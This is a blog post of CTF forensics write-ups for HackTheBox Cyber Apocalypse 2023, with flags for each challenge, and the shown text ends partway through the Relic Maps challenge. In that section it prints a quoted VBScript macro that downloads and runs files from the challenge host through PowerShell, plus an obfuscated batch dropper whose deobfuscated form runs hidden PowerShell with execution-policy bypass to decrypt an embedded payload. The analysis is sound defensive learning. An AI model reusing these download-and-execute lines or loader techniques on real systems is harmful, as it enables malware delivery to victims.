<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="HackTheBox Cyber Apocalypse 2023 - Forensics" /><meta property="og:locale" content="en" /><meta name="description" content="The personal website of Tanner Johnston" /><meta property="og:description" content="The personal website of Tanner Johnston" /><link rel="canonical" href="https://nitrolabs.xyz/posts/HTB-CA2023-Forensics/" /><meta property="og:url" content="https://nitrolabs.xyz/posts/HTB-CA2023-Forensics/" /><meta property="og:site_name" content="nitrolabs" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-03-23T21:00:00-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox Cyber Apocalypse 2023 - Forensics" /><meta name="twitter:site" content="@" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-03-23T21:00:00-04:00","datePublished":"2023-03-23T21:00:00-04:00","description":"The personal website of Tanner Johnston","headline":"HackTheBox Cyber Apocalypse 2023 - Forensics","mainEntityOfPage":{"@type":"WebPage","@id":"https://nitrolabs.xyz/posts/HTB-CA2023-Forensics/"},"url":"https://nitrolabs.xyz/posts/HTB-CA2023-Forensics/"}</script><title>HackTheBox Cyber Apocalypse 2023 - Forensics | nitrolabs</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="nitrolabs"><meta name="application-name" content="nitrolabs"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return 'mode'; } static get MODE_ATTR() { return 'data-mode'; } static get DARK_MODE() { return 'dark'; } static get LIGHT_MODE() { return 'light'; } static get ID() { return 'mode-toggle'; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia('(prefers-color-scheme: dark)'); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { document.documentElement.removeAttribute(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage( { direction: ModeToggle.ID, message: this.modeStatus }, '*' ); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.notify(); } /* flipMode() */ } /* ModeToggle */ const modeToggle = new ModeToggle(); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"> <img src="/assets/img/avatar/avatar.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"> </a><h1 class="site-title"> <a href="/">nitrolabs</a></h1><p class="site-subtitle fst-italic mb-0">Personal Website of Tanner Johnston</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/homelab/" class="nav-link"> <i class="fa-fw fas fa-server"></i> <span>MY HOMELAB</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/nitrowv" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://defcon.social/@nitrowv" aria-label="mastodon" target="_blank" rel="noopener noreferrer me" > <i class="fab fa-mastodon"></i> </a> <a href="https://linkedin.com/in/tjjohnston19" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="javascript:location.href = 'mailto:' + ['contact','nitrolabs.xyz'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox Cyber Apocalypse 2023 - Forensics</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4" ><article class="px-1"><header><h1 data-toc-skip>HackTheBox Cyber Apocalypse 2023 - Forensics</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1679619600" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Mar 23, 2023 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/nitrowv">Tanner Johnston</a> </em> </span> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="2248 words" > <em>12 min</em> read</span></div></div></header><div class="content"><p><a href="/assets/img/ctf-writeups/ca2023/forensics/scoreboard.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/scoreboard.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>I had a lot of fun with the forensics challenges! Looking at writeups for Bashic Ransomware, I probably could have gotten that one too but 8/10 is nothing to scoff at!</p><h2 id="plaintext-treasure"><span class="me-2">Plaintext Treasure</span><a href="#plaintext-treasure" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Difficulty: Very Easy - 300 points</p><blockquote><p>Threat intelligence has found that the aliens operate through a command and control server hosted on their infrastructure. Pandora managed to penetrate their defenses and have access to their internal network. Because their server uses HTTP, Pandora captured the network traffic to steal the server’s administrator credentials. Open the provided file using Wireshark, and locate the username and password of the admin.</p></blockquote><p>In this challenge, we are given a pcap packet capture file containing TCP and HTTP traffic.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/plaintext/pcap.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/plaintext/pcap.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Following the TCP streams, I find the flag written in plaintext in the fourth TCP stream.</p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{th3s3_4l13ns_st1ll_us3_HTTP}</code></p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/plaintext/flag.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/plaintext/flag.png" alt="Packet capture" class="lazyload" data-proofer-ignore></a></p><h2 id="alien-cradle"><span class="me-2">Alien Cradle</span><a href="#alien-cradle" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Difficulty: Very Easy - 300 points</p><blockquote><p>In an attempt for the aliens to find more information about the relic, they launched an attack targeting Pandora’s close friends and partners that may know any secret information about it. During a recent incident believed to be operated by them, Pandora located a weird PowerShell script from the event logs, otherwise called PowerShell cradle. These scripts are usually used to download and execute the next stage of the attack. However, it seems obfuscated, and Pandora cannot understand it. Can you help her deobfuscate it?</p></blockquote><p>In this challenge, we are given a Powershell script.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/alien_cradle/flag.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/alien_cradle/flag.png" alt="flag" class="lazyload" data-proofer-ignore></a></p><p>The flag is already visible in this section, we just need to put the pieces together.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">IO.MemoryStream</span><span class="p">(,[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span><span class="nv">$f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'H'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'T'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'B'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'{p0w3rs'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'h3ll'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'_Cr4d'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'l3s_c4n_g3t'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'_th'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'3_j0b_d'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'0n3}'</span><span class="p">;</span><span class="w">
</span></pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}</code></p><h2 id="extraterrestrial-persistence"><span class="me-2">Extraterrestrial Persistence</span><a href="#extraterrestrial-persistence" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Difficulty: Very Easy - 300 points</p><blockquote><p>There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence?</p></blockquote><p>This challenge provides us a Bash script that downloads a service if the user pandora is logged into hostname linux_HQ, gives execution permission to it, and writes a Base64 encoded payload to <code class="language-plaintext highlighter-rouge">/usr/lib/systemd/service.service</code>.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/et_persistence/script.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/et_persistence/script.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Decoding this payload, we find the flag in the description of the service.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/et_persistence/flag.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/et_persistence/flag.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{th3s3_4l13nS_4r3_s00000_b4s1c}</code></p><h2 id="roten"><span class="me-2">Roten</span><a href="#roten" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Difficulty: Easy - 300 points</p><blockquote><p>The iMoS is responsible for collecting and analyzing targeting data across various galaxies. The data is collected through their webserver, which is accessible to authorized personnel only. However, the iMoS suspects that their webserver has been compromised, and they are unable to locate the source of the breach. They suspect that some kind of shell has been uploaded, but they are unable to find it. The iMoS have provided you with some network data to analyse, its up to you to save us.</p></blockquote><p>This challenge presents another packet capture with TCP and HTTP traffic.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/roten/pcap.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/roten/pcap.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Using the export objects feature in Wireshark, I find this obfuscated PHP webshell that was uploaded to the server on the map update page.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/roten/stream173.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/roten/stream173.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Saving this PHP script, I noticed that the obfuscated portions were appended to one another and were evaluated at the end of the script.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/roten/obfshell.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/roten/obfshell.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Replacing the <code class="language-plaintext highlighter-rouge">eval()</code> statement with <code class="language-plaintext highlighter-rouge">echo()</code>, I would be able to get the deobfuscated shell script. In doing so, I revealed the flag in a comment.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/roten/flag.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/roten/flag.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{W0w_ROt_A_DaY}</code></p><h2 id="packet-cyclone"><span class="me-2">Packet Cyclone</span><a href="#packet-cyclone" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Difficulty: Easy - 300 points</p><blockquote><p>Pandora’s friend and partner, Wade, is the one that leads the investigation into the relic’s location. Recently, he noticed some weird traffic coming from his host. That led him to believe that his host was compromised. After a quick investigation, his fear was confirmed. Pandora tries now to see if the attacker caused the suspicious traffic during the exfiltration phase. Pandora believes that the malicious actor used rclone to exfiltrate Wade’s research to the cloud. Using the tool called “chainsaw” and the sigma rules provided, can you detect the usage of rclone from the event logs produced by Sysmon? To get the flag, you need to start and connect to the docker service and answer all the questions correctly.</p></blockquote><p>In this challenge, we are given Windows event logs and sigma rules that we need to use a tool called <a href="https://github.com/WithSecureLabs/chainsaw">chainsaw</a> to parse. Using the command below, we get a match for two events.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/packet_cyclone/chainsaw.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/packet_cyclone/chainsaw.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>These events correspond to execution of rclone.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/packet_cyclone/output.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/packet_cyclone/output.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>With this information, I connected to the Docker instance and answered the questions that were asked of me.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/packet_cyclone/flag.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/packet_cyclone/flag.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>In return, I received the flag.</p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{3v3n_3xtr4t3rr3str14l_B31nGs_us3_Rcl0n3_n0w4d4ys}</code></p><h2 id="artifacts-of-dangerous-sightings"><span class="me-2">Artifacts of Dangerous Sightings</span><a href="#artifacts-of-dangerous-sightings" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Difficulty: Medium - 300 points</p><blockquote><p>Pandora has been using her computer to uncover the secrets of the elusive relic. She has been relentlessly scouring through all the reports of its sightings. However, upon returning from a quick coffee break, her heart races as she notices the Windows Event Viewer tab open on the Security log. This is so strange! Immediately taking control of the situation she pulls out the network cable, takes a snapshot of her machine and shuts it down. She is determined to uncover who could be trying to sabotage her research, and the only way to do that is by diving deep down and following all traces …</p></blockquote><p>In this challenge, we are given a VHDX virtual disk image. After loading the image into Autopsy, I ran a string search for some common strings, one one of them being <code class="language-plaintext highlighter-rouge">powershell</code>. In one of the first results, I noticed an interesting match.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/artifacts/ads.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/artifacts/ads.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>The <code class="language-plaintext highlighter-rouge">type finpayload &gt; C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1</code> line indicates that the payload was written to an Alternate Data Stream, hiding the Powershell script inside of <code class="language-plaintext highlighter-rouge">ActiveSyncProvider.dll</code>. In order to access this, I mounted the disk image in a Windows VM and used the <code class="language-plaintext highlighter-rouge">type C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1</code> command. Inside the alternate data stream, there was a Base64 encoded powershell payload that when decoded, revealed a heavily obfuscated Powershell script.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/artifacts/obfuscated.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/artifacts/obfuscated.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>I then used <a href="https://github.com/Malandrone/PowerDecode">PowerDecode</a> to run dynamic analysis against the script. Initially, there were some errors in the script that had to be remedied, as well as me needing to enable long file names in the Registry, but it was able to deobfuscate the script and show the flag.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/artifacts/flag.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/artifacts/flag.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{Y0U_C4nt_St0p_Th3_Alli4nc3}</code></p><h2 id="relic-maps"><span class="me-2">Relic Maps</span><a href="#relic-maps" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Difficulty: Medium - 300 points</p><blockquote><p>Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows?Investigate the given attachment and figure out what’s going on and get the flag. The link is to http://relicmaps.htb:/relicmaps.one. The document is still live (relicmaps.htb should resolve to your docker instance).</p></blockquote><p>For this challenge, we are given a link to a OneNote document (<code class="language-plaintext highlighter-rouge">relicmaps.one</code>) hosted on the Docker environment. Running strings against this file, I find a suspicious piece of VBScript that downloads two files, another OneNote document and a <code class="language-plaintext highlighter-rouge">window.bat</code> batch script.</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c1">'more code above...</span>
<span class="k">Sub</span> <span class="nf">AutoOpen</span><span class="p">()</span>
    <span class="n">ExecuteCmdAsync</span> <span class="s">"cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/uploads/soft/topsecret-maps.one -OutFile $env:tmp\tsmap.one; Start-Process -Filepath $env:tmp\tsmap.one"</span>
    <span class="n">ExecuteCmdAsync</span> <span class="s">"cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/get/DdAbds/window.bat -OutFile $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat"</span>
<span class="k">End</span> <span class="k">Sub</span>
<span class="c1">'more code below...</span>
</pre></table></code></div></div><p>Downloading the batch script, I see that it is quite obfuscated and the commented middle portion starting with SEWD appears to be a Base64 encoded string.</p><div class="language-batch highlighter-rouge"><div class="code-header"> <span data-label-text="Batch"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>@echo <span class="na">off</span>
<span class="kd">set</span> <span class="s2">"eFlP=set "</span>
<span class="nv">%eFlP%</span><span class="s2">"ualBOGvshk=ws"</span>
<span class="nv">%eFlP%</span><span class="s2">"PxzdwcSExs= /"</span>
<span class="nv">%eFlP%</span><span class="s2">"ndjtYQuanY=po"</span>
<span class="nv">%eFlP%</span><span class="s2">"cHFmSnCqnE=Wi"</span>
<span class="nv">%eFlP%</span><span class="s2">"CJnGNBkyYp=co"</span>
<span class="nv">%eFlP%</span><span class="s2">"jaXcJXQMrV=rS"</span>

<span class="kd">snip</span>

<span class="c">:: SEWD/RSJz4q93dq1c+u3tVcKPbLfn1fTrwl01pkHX3+NzcJ42N+ZgqbF+h+S76xsuroW3DDJ50IxTV/PbQICDVPjPCV3DYvCc244F7AFWphPY3kRy+618kpRSK2jW9RRcOnj8dOuDyeLwHfnBbkGgLE4KoSttWBplznkmb1l50KEFUavXv9ScKbGilo9+85NRKfafzpZjkMhwaCuzbuGZ1+5s9CdUwvo3znUpgmPX7S8K4+uS3SvQNh5iPNBdZHmyfZ9SbSATnsXlP757ockUsZTEdltSce4ZWF1779G6RjtKJcK4yrHGpRIZFYJ3pLosmm7d+SewKQu1vGJwcdLYuHOkdm5mglTyp20x7rDNCxobvCug4Smyrbs8XgS3R4jHMeUl7gdbyV/eTu0bQAMJnIql2pEU/dW0krE90nlgr3tbtitxw3p5nUP9hRYZLLMPOwJ12yNENS7Ics1ciqYh78ZWJiotAd4DEmAjr8zU4U...</span>

<span class="kd">snip</span>

<span class="nv">%CJnGNBkyYp%%</span><span class="kd">UBndSzFkbH</span><span class="nv">%%ujJtlzSIGW%%</span><span class="kd">nwIWiBzpbz</span><span class="nv">%%cHFmSnCqnE%%</span><span class="kd">kTEDvsZUvn</span><span class="nv">%%JBRccySrUq%%</span><span class="kd">ZqjBENExAX</span><span class="nv">%%XBucLtReBQ%%</span><span class="kd">BFTOQBPCju</span><span class="nv">%%vlwWETKcZH%%</span><span class="kd">NCtxqhhPqI</span><span class="nv">%%GOPdPuwuLd%%</span><span class="kd">YcnfCLfyyS</span><span class="nv">%%JPfTcZlwxJ%%</span><span class="kd">ualBOGvshk</span><span class="nv">%%xprVJLooVF%%</span><span class="kd">cIqyYRJWbQ</span><span class="nv">%%jaXcJXQMrV%%</span><span class="kd">pMrovuxjjq</span><span class="nv">%%KXASGLJNCX%%</span><span class="kd">XzrrbwrpmM</span><span class="nv">%%VCWZpprcdE%%</span><span class="kd">tzMKflzfvX</span><span class="nv">%%ndjtYQuanY%%</span><span class="kd">chXxviaBCr</span><span class="nv">%%tHJYExMHlP%%</span><span class="kd">WmUoySsDby</span><span class="nv">%%UrPeBlCopW%%</span><span class="kd">lYCdEGtlPA</span><span class="nv">%%eNOycQnIZD%%</span><span class="kd">PxzdwcSExs</span><span class="nv">%%VxroDYJQKR%%</span><span class="kd">zhNAugCrcK</span><span class="nv">%%XUpMhOyyHB%%</span><span class="kd">OOOxFGwzUd</span><span class="err">%</span>
<span class="nb">cls</span>
<span class="nv">%dzPrbmmccE%%</span><span class="kd">xQseEVnPet</span><span class="err">%</span>
<span class="nv">%eDhTebXJLa%%</span><span class="kd">vShQyqnqqU</span><span class="nv">%%KsuJogdoiJ%%</span><span class="kd">uVLEiIUjzw</span><span class="nv">%%SJsEzuInUY%%</span><span class="kd">gNELMMjyFY</span><span class="nv">%%XIAbFAgCIP%%</span><span class="kd">weRTbbZPjT</span><span class="nv">%%yQujDHraSv%%</span><span class="kd">zwDBykiqZZ</span><span class="nv">%%nfEeCcWKKK%%</span><span class="kd">MtoMzhoqyY</span><span class="nv">%%igJmqZApvQ%%</span><span class="kd">SIQjFslpHA</span><span class="nv">%%KHqiJghRbq%%</span><span class="kd">WSRbQhwrOC</span><span class="nv">%%BGoTReCegg%%</span><span class="kd">WYJXnBQBDj</span><span class="nv">%%SIneUaQPty%%</span><span class="kd">WTAeYdswqF</span><span class="vm">%%E</span>
</pre></table></code></div></div><p>Running this script through DissectMalware’s <a href="https://github.com/DissectMalware/batch_deobfuscator">batch_deobfuscator</a>, I got a somewhat readable version of the script.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/relic_maps/deobf.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/relic_maps/deobf.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Cleaning this up a bit, I can get a better idea of what’s going on.</p><div class="language-batch highlighter-rouge"><div class="code-header"> <span data-label-text="Batch"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="nb">copy</span> <span class="kd">C</span>:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe <span class="na">/y </span><span class="err">%</span><span class="o">~</span><span class="m">0</span>.exe

<span class="nb">cls</span>
<span class="nb">cd</span> <span class="vm">%~dp0</span>
<span class="vm">%~nx0</span>.exe <span class="na">-noprofile -windowstyle </span><span class="kd">hidden</span> <span class="na">-ep </span><span class="kd">bypass</span> <span class="na">-command </span>$eIfqq <span class="o">=</span> <span class="o">[</span><span class="kd">System</span>.IO.File<span class="o">]</span>::<span class="o">(</span><span class="s1">'txeTllAdaeR'</span><span class="o">[-</span><span class="m">1</span>..<span class="o">-</span><span class="m">11</span><span class="o">]</span> <span class="na">-join </span><span class="s1">''</span><span class="o">)(</span><span class="s1">'</span><span class="vm">%~f0</span><span class="s1">'</span><span class="o">)</span>.Split<span class="o">([</span><span class="kd">Environment</span><span class="o">]</span>::NewLine<span class="o">)</span>

<span class="kd">foreach</span> <span class="o">(</span>$YiLGW <span class="k">in</span> $eIfqq<span class="o">)</span> <span class="o">{</span> 
	<span class="k">if</span> <span class="o">(</span>$YiLGW.StartsWith<span class="o">(</span><span class="s1">':: '</span><span class="o">))</span> <span class="o">{</span>  
		$VuGcO <span class="o">=</span> $YiLGW.Substring<span class="o">(</span><span class="m">3</span><span class="o">)</span>
 		<span class="nb">break</span>
 	<span class="o">}</span>
<span class="o">}</span>

$uZOcm <span class="o">=</span> <span class="o">[</span><span class="kd">System</span>.Convert<span class="o">]</span>::<span class="o">(</span><span class="s1">'gnirtS46esaBmorF'</span><span class="o">[-</span><span class="m">1</span>..<span class="o">-</span><span class="m">16</span><span class="o">]</span> <span class="na">-join </span><span class="s1">''</span><span class="o">)(</span>$VuGcO<span class="o">)</span>
$BacUA <span class="o">=</span> <span class="kd">New</span><span class="na">-Object </span><span class="kd">System</span>.Security.Cryptography.AesManaged
$BacUA.Mode <span class="o">=</span> <span class="o">[</span><span class="kd">System</span>.Security.Cryptography.CipherMode<span class="o">]</span>::CBC
$BacUA.Padding <span class="o">=</span> <span class="o">[</span><span class="kd">System</span>.Security.Cryptography.PaddingMode<span class="o">]</span>::PKCS7
